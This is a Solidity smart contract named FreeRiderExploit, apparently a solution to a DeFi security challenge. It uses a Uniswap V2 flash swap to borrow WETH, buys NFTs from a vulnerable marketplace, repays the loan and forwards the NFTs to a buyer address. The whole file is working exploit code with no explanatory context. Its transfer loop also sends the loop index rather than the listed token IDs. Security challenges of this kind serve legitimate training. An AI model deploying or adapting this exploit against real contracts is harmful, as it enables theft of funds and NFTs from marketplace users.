pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";


interface IUniswapPair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface IWeth {
    function approve(address spender, uint256 amount) external returns (bool);
    function withdraw(uint wad) external;
    function deposit() external payable;
    function transfer(address dst, uint wad) external returns (bool);
}
interface INFT {
    function balanceOf(address account) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function approve(address to, uint256 tokenId) external;
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}
interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
}

contract FreeRiderExploit is IERC721Receiver{
    using Address for address;
    
    address pairAddress;
    address wethAddress;
    address marketAddress;
    address nftAddress;
    address buyerAddress;

    constructor(address _pairAddress, address _wethAddress, address _marketAddress, address _nftAddress, address _buyerAddress) {
        pairAddress = _pairAddress;
        wethAddress = _wethAddress;
        marketAddress = _marketAddress;
        nftAddress = _nftAddress;
        buyerAddress = _buyerAddress;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    function exploit(uint amount0Out, uint amount1Out, uint256[] calldata _tokenId) public {
        uint256[] memory tokenIds = _tokenId;
        IUniswapPair(pairAddress).swap(
            amount0Out,
            amount1Out,
            address(this),
            abi.encode(tokenIds)
        );
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        (uint256[] memory tokenIds) = abi.decode(data, (uint256[]));
        IWeth(wethAddress).withdraw(amount0);
        IMarketplace(marketAddress).buyMany{value:amount0}(tokenIds);
        IWeth(wethAddress).deposit{value: 15.05 ether}();
        IWeth(wethAddress).transfer(pairAddress, 15.05 ether);
        for (uint i = 0; i < tokenIds.length; i++) {
            INFT(nftAddress).safeTransferFrom(address(this), buyerAddress, i);
        }
    }

    receive() external payable {}
}